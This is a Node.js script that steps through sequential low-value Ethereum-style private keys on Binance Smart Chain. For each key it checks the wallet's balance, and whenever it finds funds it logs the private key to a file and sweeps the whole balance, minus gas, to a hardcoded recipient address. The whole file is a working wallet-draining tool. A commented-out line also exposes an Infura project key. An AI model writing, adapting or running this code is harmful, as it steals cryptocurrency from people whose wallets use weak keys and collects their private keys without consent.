const Web3 = require("web3");
const fs = require("fs");

const arr = [
  "https://bsc-dataseed.binance.org",
  "https://bsc-dataseed1.defibit.io",
  "https://bsc-dataseed1.ninicoin.io",
  "https://bsc-dataseed2.defibit.io",
  "https://bsc-dataseed3.defibit.io",
  "https://bsc-dataseed4.defibit.io",
  "https://bsc-dataseed2.ninicoin.io",
  "https://bsc-dataseed3.ninicoin.io",
  "https://bsc-dataseed4.ninicoin.io",
  "https://bsc-dataseed1.binance.org",
  "https://bsc-dataseed2.binance.org",
  "https://bsc-dataseed3.binance.org",
  "https://bsc-dataseed4.binance.org",
];

const getWeb3 = () => {
  const web3 = new Web3(
    new Web3.providers.HttpProvider(arr[Math.floor(Math.random() * arr.length)])
  );
  return web3;
};

// const web3 = new Web3("https://bsc-dataseed1.defibit.io");
// const web3 = new Web3("https://bsc-dataseed.binance.org");
// const web3Ether = new Web3(
//   "https://mainnet.infura.io/v3/afa9553623db44b388348836b654f819"
// );

let i = 0;

const genRanHex = (size) => {
  const res =
    [...Array(size)].map(() => "0").join("") + Number(++i).toString(16);
  return res.slice(-size);
};
const sleep = (ms) =>
  new Promise((resolve) => {
    setTimeout(resolve, ms);
  });

const main = async () => {
  try {
    while (true) {
      const web3 = getWeb3();
      const privateKey = genRanHex(64);
      const address = web3.eth.accounts.privateKeyToAccount(privateKey).address;
      const balance = await web3.eth.getBalance(address);
      if (balance > 0) {
        await sendEther(address, balance, privateKey);
      } else {
        console.log(address, "no balance");
      }
    }
  } catch (error) {
    console.error(error.message);
    await sleep(5000);
    await main();
  }
};

const sendEther = async (from, balance, privateKey) => {
  const web3 = getWeb3();

  const to = "0x52D53cF066da6738e8F7A6E201a597C3380C13B6";
  const gasPrice = await web3.eth.getGasPrice(); // estimate the gas price
  const transactionObject = {
    from: from,
    to: to,
    value: 1,
  };

  const gasLimit = await web3.eth.estimateGas(transactionObject);
  const transactionFee = gasPrice * gasLimit;
  transactionObject.gas = gasLimit;
  transactionObject.value = balance - transactionFee;

  if (transactionObject.value >= 0) {
    console.log(privateKey, balance);
    fs.appendFileSync("privateKeys.txt", privateKey + " " + balance + "\n");
    web3.eth.accounts.wallet.add({
      privateKey,
      address: from,
    });
    const tx = await web3.eth.sendTransaction(transactionObject);
    web3.eth.getTransaction(tx);
  } else {
    console.log(from, balance, "balance too low");
  }
};

main();
